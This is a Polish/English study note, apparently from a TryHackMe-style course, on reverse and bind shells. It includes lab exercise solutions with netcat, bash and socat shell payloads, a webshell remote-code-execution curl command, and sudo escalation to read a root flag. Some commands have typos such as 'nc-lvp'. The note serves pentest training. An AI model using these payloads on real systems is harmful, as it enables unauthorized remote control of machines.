# Zdalne powłoki
Zdalne powłoki
 Wyróżniamy dwóch aktorów:  
 • Pentester(student)  
 • Cel(maszyna namapie)  

Zdalne powłoki (`remote shells`) pozwalają pentesterowi na zdalne wykonywanie  
poleceń powłoki na maszynie celu.  
Zdalne powłoki działają w modelu klient-serwer:
 • Serwer nasłuchuje (w pierwszej kolejności)
 • Klient się łączy (w drugiej kolejności).

Nieważne, która strona jest klientem, a która serwerem.

Zwróć uwagę, że POWŁOKA zawsze działa na maszynie Celu, nigdy na maszynie Pentestera

## Reverse shell - connect back shell
The connections initiate from the target system to the attacker's machine,  
which can help avoid detection from network firewalls and other security appliances.

Gdy Pentester nasłuchuje (serwer), a Cel inicjuje połączenie (klient), technikę 
tę nazywamy Reverse Shell.
````
Pentester                                   Cel
Nasłuchuje (serwer),       <---------       Łączy się (klient),
zdalnie wykonuje komendy                    uruchamia powłokę
````

Reverse shell will connect back to the attacker's machine, your machine (attacker) should waite for a connection.
For example use netcat to listen to a connection on port 443 (create a listener):
`nc -lvnp 443`

`-l` option to indicate Netcat to listen or wait for a connection.  
`-v` option enables verbose mode.  
`-n` option prevents the connections from using DNS for lookup, so it will not resolve any hostname it will use an IP address.  
`-p` flag indicates the port that will be used to wait for the connection, in the case above, port 443.  

Any port can be used to wait for a connection, but attackers and pentesters tend to use known ports used by other applications 
like `53, 80, 8080, 443, 139, or 445`. This is to blend the reverse shell with legitimate traffic and avoid detection by security appliances.  
Once we have our listener set, the attacker should execute what is known as a reverse shell payload.  

A `shell payload` can be a command or script that exposes the shell to an incoming connection in the case of a bind shell  
or  send connection in the case of a reverse shell.  

`web shell`: a malicious script uploaded to a vulnerable web application to gain unauthorized access.

This payload usually abuses the vulnerability or unauthorized access granted by the attacker and executes a command that will  
expose the shell through the network.  
For more see: https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet  
Example:
`rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f`

## Bind shell
A bind shell will bind a port on the compromised system and listen for a connection; when this connection occurs,  
it exposes the shell session so the attacker can execute commands remotely.  
This method can be used when the compromised target does not allow outgoing connections  

Gdy cel nasłuchuje (serwer), a Pentester inicjuje połączenie (klient), technikę tę nazywamy `Bind Shell`.

```
Cel                                       Pentester
Nasłuchuje (serwer),        <----------   Łączy się (klient)
uruchamia powłokę                         zdalnie wykonuje komendy
```

In this case, the attacker can use a command like the one below on the target machine.
`rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f`

Now that the target machine is waiting for incoming connections, we can use Netcat again with the following command to connect.

`nc -nv TARGET_IP 8080`

## Listeners
`rlwrap`: command-line utility provides readline-style editing and command history for programs that lack it, enhancing the interaction with a shell listener
`rlwrap nc -lvnp 443` This wraps nc with rlwrap, allowing the use of features like arrow keys and history for better interaction.

`nc`: netcat
`ncat`: This wraps nc with rlwrap, allowing the use of features like arrow keys and history for better interaction.
example: `ncat -ssl -lvnp 4444`

`socat`: It is a utility that allows you to create a socket connection between two data sources, in this case, two different hosts.
Example: `socat -d -d TCP-LISTEN:443 STDOUT` 
The command above used the -d option to enable verbose output; using it again (-d -d) will increase the verbosity of the commands.  
The TCP-LISTEN:443 option creates a TCP listener on port 443, establishing a server socket for incoming connections.  
Finally, the STDOUT option directs any incoming data to the terminal.

### Ćwiczenia studia
`Netcat (Reverse TCP)`
Celem zadania jest nawiązanie połączenia TCP (za pomocą nc) 
pomiędzy serwerem 192.168.100.6 a maszyną studenta podłączoną do VPN.  
Student powinien nasłuchiwać na porcie 10001/tcp, a serwer nawiązać połączenie do studenta.

`Student: nc-lvp 10001`  
`Serwer: nc <IP_STUDENTA> 10001`

`Reverse Shell (nc)`
Celem zadania jest uruchomienie zdalnej powłoki bash na serwerze
192.168.100.6 za pomocą techniki reverse shell i narzędzia nc.  
Student powinien nasłuchiwać na porcie 10002/tcp, a serwer nawiązać połączenie
do studenta i uruchomić zdalną powłokę bash.

`Student: nc -lvp 10002`  
`Serwer: nc <IP_STUDENTA> 10002 -e /bin/bash`

`Reverse Shell (bash)`
Celem zadania jest uruchomienie zdalnej powłoki bash na serwerze 192.168.100.6
za pomocą techniki reverse shell i tylko (bez nc na serwerze) narzędzia bash.
Student powinien nasłuchiwać na porcie 10003/tcp, a serwer nawiązać połączenie do studenta i uruchomić zdalną powłokę bash.

`Student: nc-lvp 10003`  
`Serwer (bez nc): bash-i >& /dev/tcp/<IP_STUDENTA>/10003 0>&1`

`Reverse Shell (socat)`
Celem zadania jest uruchomienie zdalnej powłoki bash na serwerze 192.168.100.6
za pomocą techniki reverse shell i narzędzia socat. Student powinien nasłuchiwać na porcie 10004/tcp,  
a serwer nawiązać połączenie do studenta i uruchomić zdalną powłokę bash.

```
Student: socat file:`tty`,raw,echo=0 tcp-listen:10004
Serwer: socat tcp-connect:<IP_STUDENTA>:10004 exec:/bin/bash,pty,stderr,setsid,sigint,sane
```

`Netcat (Bind TCP)`
Celem zadania jest nawiązanie połączenia TCP (za pomocą nc) pomiędzy serwerem
192.168.100.6 a maszyną studenta podłączoną do VPN. Serwer powinien
nasłuchiwać na porcie 20001/tcp, a student nawiązać połączenie do serwera.

```
Serwer: nc-lvp 20001
Student: nc 192.168.100.6 20001
```

`Bind Shell (nc)`
Celem zadania jest uruchomienie zdalnej powłoki bash na serwerze 
192.168.100.6 za pomocą techniki bind shell i narzędzia nc. Serwer powinien 
nasłuchiwać na porcie 20002/tcp, a student nawiązać połączenie do serwera
i uzyskać dostęp do zdalnej powłoki

```
Serwer: nc-lvp 20002 -e /bin/bash
Student: nc 192.168.100.6 20002

nc: Uruchamia program Netcat.
-l: Oznacza tryb nasłuchiwania (listening). Netcat będzie nasłuchiwał na określonym porcie, zamiast inicjować połączenie wychodzące.
-v: Oznacza tryb rozmowny (verbose), co pozwala na bardziej szczegółowe logowanie komunikatów o stanie połączenia.
-p 20002: Ustawia port 20002 jako port nasłuchujący. Klient musi połączyć się z tym portem, aby nawiązać połączenie.
-e /bin/bash: Oznacza, że po nawiązaniu połączenia Netcat wykona wskazany program. W tym przypadku jest to /bin/bash, co oznacza, że osoba łącząca się z Netcat otrzyma dostęp do powłoki systemowej na komputerze uruchamiającym to polecenie.
```

`Bind Shell (socat)`
Celem zadania jest uruchomienie zdalnej powłoki bash na serwerze
192.168.100.6 za pomocą techniki bind shell i narzędzia socat.  
Serwer powinien nasłuchiwać na porcie 20003/tcp, a student nawiązać połączenie
do serwera i uzyskać dostęp do zdalnej powłoki

```
Serwer: socat TCP-LISTEN:20003,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
Student: socat FILE:`tty`,raw,echo=0 TCP:192.168.100.6:20003
```

### Ćwiczenia pentest
`Lynx`
Celem zadania jest wykorzystanie przeglądarki internetowej Lynx do wyświetlenia strony http://192.168.200.56/
`Lynx` jest to przeglądarka internetowa, która działa w trybie tekstowym.
Przydaje się, gdy nie mamy możliwości skorzystania ze środowiska graficznego do wyświetlenia danej strony www.  

Uwaga! Maszyna192.168.200.56jest widoczna tylko z maszyny 192.168.100.6.
NIE możnasię doniej połączyć z poziomu Kali studenta w VPN.
`student@remote-shells: lynx 192.168.200.56`

`.bash_history`
Celem zadania jest odczytanie pliku .bash_history na serwerze webowym. Można 
wykorzystać do tego przeglądarkę Lynx z poprzedniego zadania.

`Zdalne wykonanie komend (RCE)`
Celem zadania jest wykorzystanie komendy odczytanej w .bash_history
do zdalnego wykonania komend na serwerze.
`student@remote-shells: curl 'http://192.168.200.56/shell.php?x=id%20webadmin'`
Uwaga! Parametr x należy zakodować jako URL (%20to kod ASCII spacji w hex)

`Zdalna powłoka`
Celem zadania jest nawiązanie połączenia reverse shell lub bind shell na porcie
1337 z maszyną 192.168.200.56. Na maszynie dostępna jest usługa webowa,
którą można podejrzeć za pomocą przeglądarki Lynx.
W pliku .bash_history znajdziemy przykładowe użycie webshella o nazwie
shell.php. Możemy zmienić komendę „id” na dowolną zdalną powłokę, którą znamy.  

```
student@remote-shells (terminal 1): curl 'http://192.168.200.56/shell.php?x=nc+-e+/bin/bash+-lvp+1337' #komenda powinna „wisieć”.
student@remote-shells (terminal 2): nc 192.168.200.56 1337
```

`Flaga Roota`
Ostatnim krokiem jest odczytanie flagi ukrytej w katalogu domowym użytkownika
root. Użytkownik jest w grupie sudo oraz może używać sudo bez hasła.
```
id #grupa sudo
sudo-l
sudo su
ls -al /root
cat /root/root.txt

id #grupa sudo:
Wyświetla informacje o bieżącym użytkowniku, takie jak UID (User ID), GID (Group ID) i grupy, do których należy.
Jeśli dodasz komentarz #grupa sudo, to jest to tylko przypis informacyjny lub dokumentacyjny i nie wpływa na działanie polecenia.

sudo-l:
Wyświetla listę poleceń, które użytkownik może uruchamiać jako root lub inny użytkownik bez podawania hasła lub z nim.
```
___
## Sources
- https://tryhackme.com/